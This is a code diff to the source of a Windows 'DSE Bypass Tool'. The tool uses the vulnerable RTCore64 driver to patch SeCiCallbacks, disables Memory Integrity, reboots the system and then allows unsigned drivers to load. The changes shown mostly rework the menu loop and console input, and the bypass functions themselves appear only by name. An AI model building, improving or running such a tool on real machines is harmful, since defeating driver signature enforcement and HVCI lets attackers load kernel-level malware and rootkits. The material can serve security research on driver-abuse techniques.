@@ -1,9 +1,13 @@
+﻿#define NOMINMAX
+#include <Windows.h>
 #include "drvloader.h"
 #include <iostream>
 #include <psapi.h>
+#include <limits>
 #include <vector>
 #include <fstream>
 #include <sstream>
+#include <conio.h>
 #include <winreg.h>
 #include <shlwapi.h>
 #include <shlobj.h>
@@ -473,7 +477,7 @@ void DisplayOffsetInfo(DrvLoader& loader) {
         std::wcout << L"[Patch1] or [Unpatch1] section in drivers.ini:\n";
         std::wcout << L"....................................\n";
         
-        // Używamy std::cout dla ASCII zamiast std::wcout dla Unicode
+        // Using std::cout for ASCII instead of std::wcout for Unicode
         std::cout << "Offset_SeCiCallbacks=0x" << std::hex << std::uppercase << *seCiCallbacksOffset << std::dec << std::endl;
         std::cout << "Offset_Callback=0x20" << std::endl;
         std::cout << "Offset_SafeFunction=0x" << std::hex << std::uppercase << *zwFlushOffset << std::dec << std::endl;
@@ -488,8 +492,8 @@ void DisplayOffsetInfo(DrvLoader& loader) {
     std::wcout << L"After Windows updates, regenerate these values.\n";
     std::wcout << L"\n";
     std::wcout << L"Press any key to return to menu...";
-    std::wcin.ignore();
-    std::wcin.get();
+    FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+    _getwch();
 }
 
 void DisplayMenu(bool isPatched) {
@@ -542,8 +546,8 @@ bool CheckAndDisableMemoryIntegrity() {
             
             std::wcout << L"[+] Memory Integrity disabled. System will reboot to apply changes.\n";
             std::wcout << L"[+] Press any key to continue with reboot...";
-            std::wcin.ignore();
-            std::wcin.get();
+            FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+            _getwch();
             
             // Initiate system reboot
             HANDLE hToken;
@@ -1111,64 +1115,95 @@ bool DrvLoader::RestoreDSE() {
 
 int main() {
     DisplayBanner();
-    
+
     // Check Memory Integrity status first
     if (!CheckAndDisableMemoryIntegrity()) {
         std::wcout << L"[-] Failed to check Memory Integrity status\n";
         return 1;
     }
-    
+
     std::wcout << L"DSE Bypass Tool - Universal (Dynamic PDB Symbol Loading)\n";
     std::wcout << L"=========================================================\n";
     std::wcout << L"Technique: SeCiCallbacks CiValidateImageHeader replacement\n";
     std::wcout << L"Vulnerable driver: RTCore64\n";
     std::wcout << L"Symbol resolution: Microsoft Symbol Server (automatic)\n";
-    
+
     DrvLoader loader;
-    
+
     if (!loader.Initialize()) {
         std::wcout << L"\n[FAILED] Could not initialize loader\n";
+        std::wcout << L"\nPress any key to exit...";
+        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+        _getwch();
         return 1;
     }
-    
+
+    // Check DSE status once at startup
     bool isPatched = false;
     if (!loader.CheckDSEStatus(isPatched)) {
         std::wcout << L"\n[FAILED] Could not determine DSE status\n";
+        std::wcout << L"\nPress any key to exit...";
+        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+        _getwch();
         return 1;
     }
-    
-    DisplayMenu(isPatched);
-    
-    int choice = 0;
-    std::wcin >> choice;
-    
-    bool success = false;
-    
-    if (choice == 1) {
-        if (isPatched) {
-            success = loader.RestoreDSE();
-            if (success) {
-                std::wcout << L"\n[SUCCESS] DSE has been restored. Driver signature enforcement is active.\n";
-            } else {
-                std::wcout << L"\n[FAILED] DSE restoration was unsuccessful.\n";
+
+    // Main menu loop
+    while (true) {
+        DisplayMenu(isPatched);
+
+        int choice = 0;
+        std::wcin >> choice;
+
+        // Clear input buffer after reading choice
+        std::wcin.clear();
+        std::wcin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+
+        bool success = false;
+
+        if (choice == 1) {
+            if (isPatched) {
+                success = loader.RestoreDSE();
+                if (success) {
+                    std::wcout << L"\n[SUCCESS] DSE has been restored. Driver signature enforcement is active.\n";
+                    isPatched = false;
+                }
+                else {
+                    std::wcout << L"\n[FAILED] DSE restoration was unsuccessful.\n";
+                }
             }
-        } else {
-            success = loader.BypassDSE();
-            if (success) {
-                std::wcout << L"\n[SUCCESS] DSE has been bypassed. You can now load unsigned drivers.\n";
-            } else {
-                std::wcout << L"\n[FAILED] DSE bypass was unsuccessful.\n";
+            else {
+                success = loader.BypassDSE();
+                if (success) {
+                    std::wcout << L"\n[SUCCESS] DSE has been bypassed. You can now load unsigned drivers.\n";
+                    isPatched = true;
+                }
+                else {
+                    std::wcout << L"\n[FAILED] DSE bypass was unsuccessful.\n";
+                }
             }
+
+            std::wcout << L"\nPress any key to return to menu...";
+            FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+            _getwch();
+
         }
-    } else if (choice == 2) {
-        DisplayOffsetInfo(loader);
-        success = true;
-    } else if (choice == 3) {
-        std::wcout << L"\nExiting without changes.\n";
-        success = true;
-    } else {
-        std::wcout << L"\n[ERROR] Invalid option selected.\n";
+        else if (choice == 2) {
+            DisplayOffsetInfo(loader);
+
+        }
+        else if (choice == 3) {
+            std::wcout << L"\nExiting...\n";
+            break;
+
+        }
+        else {
+            std::wcout << L"\n[ERROR] Invalid option selected.\n";
+            std::wcout << L"\nPress any key to return to menu...";
+            FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+            _getwch();
+        }
     }
-    
-    return success ? 0 : 1;
+
+    return 0;
 }
